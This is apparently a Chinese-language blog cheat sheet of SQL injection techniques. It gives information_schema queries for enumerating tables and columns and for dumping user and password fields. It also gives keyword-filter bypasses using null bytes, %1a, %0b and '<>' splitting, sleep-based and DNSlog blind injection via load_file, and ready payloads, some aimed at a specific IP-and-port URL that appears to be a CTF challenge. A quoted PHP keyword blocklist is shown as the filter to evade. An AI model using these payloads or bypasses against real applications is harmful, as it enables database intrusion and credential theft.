---
title: sql注入大全
date: 2018-03-21 09:26:16
tags: 
- 安全
- sql注入
categories: 
- 安全
- sql注入
---
- 表名

  ```mysql
  select group_concat(distinct table_name) from information_schema.tables where table_schema=database()
  ```


- 列名

  ```mysql
  select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]
  ```


- 数据库

  ```mysql
  select group_concat(schema_name) from information_schema.schemata
  ```

- 表内容

  ```mysql
  select 1,concat(user, 0x2c, password) from [table_name]
  ```

  ​
```
优先级 运算符
(最高)  !
    -（负号）,~（按位取反）
    ^（按位异或）
    *,/(DIV),%(MOD)
    +,-
    >>,<<
    &
    |
    =(比较运算),<=>,<,<=,>,>=,!=,<>,IN,IS NULL,LIKE,REGEXP
   BETWEEN AND,CASE,WHEN,THEN,ELSE
   NOT
   &&,AND
   XOR
   ||,OR
(最低)    =(赋值运算),:=
```

# union select 不允许同时出现
过滤正则表达式如下:
<code>	
union[\s\xA0]+select
</code><br/>
可以使用union all select绕过

# select过滤
se%00lect绕过

# -- 注释
--后边不允许添加任何空白字符
过滤正则表达式如下:
--[\s\xA0]
还可以使用%1a
--%1a绕过

# where后边跟着sleep函数
`
select * from table_name where sleep(2) or 1 = 2;
`

如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回
如果1=1，则会立即返回所有数据

@`'` 相当于 NULL

select group_concat(ip)'' from client_ip;

# DNSlog盲注
DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like '%secure%';查看load_file()可以读取的磁盘。

1、当secure_file_priv为空，就可以读取磁盘的目录。

2、当secure_file_priv为G:\，就可以读取G盘的文件。

3、当secure_file_priv为null，load_file就不能加载文件。


sleep 不能填数字，可以使用pi()替代

各种payload:
```
select * from antisqli where `id`='\' and `pw`=md5(' union select 1,2,3--')
```

```
644400 union select 'z1',flag,'z3','z4' from flag order by password desc#
```

关键词union,select,from被过滤，可以考虑%00绕过

```
//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
	if (substr_count($id, $value) > 0)
	{
		exit('包含敏感关键字！'.$value);
	}
}

//xss过滤
$id = strip_tags($id);

$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
payload:
http://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#
由于strip_tags 将<>替换为空，所以可以使用<>绕过：
http://103.238.227.13:10087/?id=2 unio<>n se<>lect hash,2 fro%00m sql3.key#
```

某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。
id=1+uni%0bon+se%0blect+1,2,3--



## Mysql大小写不敏感，绕过检测



